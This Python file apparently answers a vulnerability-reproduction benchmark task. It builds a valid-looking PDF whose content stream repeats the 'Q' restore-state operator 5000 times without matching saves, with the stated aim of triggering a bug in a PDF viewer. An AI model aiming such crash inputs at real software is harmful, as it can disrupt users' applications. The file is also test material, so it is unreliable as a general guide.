import os


class Solution:
    def _build_pdf_poc(self) -> bytes:
        # Build a small but valid PDF that contains many unmatched 'Q' operators
        # in a content stream, aiming to trigger viewer state restoration logic.
        num_q = 5000
        content = ("Q\n" * num_q).encode("ascii")

        header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"

        # Object 1: Catalog
        obj1 = (
            b"1 0 obj\n"
            b"<< /Type /Catalog /Pages 2 0 R >>\n"
            b"endobj\n"
        )

        # Object 2: Pages
        obj2 = (
            b"2 0 obj\n"
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>\n"
            b"endobj\n"
        )

        # Object 3: Page
        obj3 = (
            b"3 0 obj\n"
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Contents 4 0 R >>\n"
            b"endobj\n"
        )

        # Object 4: Contents stream with many 'Q' operators
        obj4_header = (
            f"4 0 obj\n<< /Length {len(content)} >>\nstream\n".encode("ascii")
        )
        obj4_footer = b"\nendstream\nendobj\n"
        obj4 = obj4_header + content + obj4_footer

        objects = [obj1, obj2, obj3, obj4]

        # Compute offsets
        offsets = []
        pos = len(header)
        for obj in objects:
            offsets.append(pos)
            pos += len(obj)

        xref_offset = pos

        # Build xref table
        xref_parts = []
        xref_parts.append(f"xref\n0 {len(objects) + 1}\n".encode("ascii"))
        xref_parts.append(b"0000000000 65535 f \n")
        for off in offsets:
            xref_parts.append(f"{off:010d} 00000 n \n".encode("ascii"))
        xref = b"".join(xref_parts)

        # Trailer
        trailer = (
            f"trailer\n<< /Size {len(objects) + 1} /Root 1 0 R >>\n"
            f"startxref\n{xref_offset}\n"
            f"%%EOF\n".encode("ascii")
        )

        pdf_data = header + b"".join(objects) + xref + trailer
        return pdf_data

    def solve(self, src_path: str) -> bytes:
        # src_path is unused; PoC is independent of source contents
        return self._build_pdf_poc()